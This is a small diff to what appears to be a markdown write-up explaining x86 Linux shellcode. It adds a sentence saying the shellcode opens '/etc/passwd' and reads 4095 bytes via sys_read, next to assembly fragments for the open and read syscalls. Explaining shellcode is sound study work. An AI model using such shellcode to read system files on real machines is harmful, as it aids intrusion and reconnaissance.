@@ -64,9 +64,11 @@ mov    ebx,esp        ; putting the address and "location" of the file into ebx
 int    0x80           ; sys interrupt
 ```
 
+After opening the target file "/etc/passwd" the contents can be read using the sys_read syscall. in order to use sys_read, you need to specify buffer size and amount of data to read, in this case, the shellcode reads 4095 bytes.
+
 **Reading the file** 
 ```assembly
-xchg   eax,ebx        ; 
+xchg   eax,ebx       
 xchg   eax,ecx
 mov    al,0x3         ; using the (sys_read) sycall
 xor    edx,edx
